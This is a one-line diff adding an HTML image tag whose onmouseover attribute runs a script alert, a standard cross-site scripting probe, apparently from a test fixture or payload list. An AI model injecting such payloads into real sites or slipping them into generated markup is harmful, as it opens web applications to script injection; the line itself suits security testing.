@@ -1,0 +1,1 @@
+<img src='<PATH>' onmouseover='alert(XSS)'>
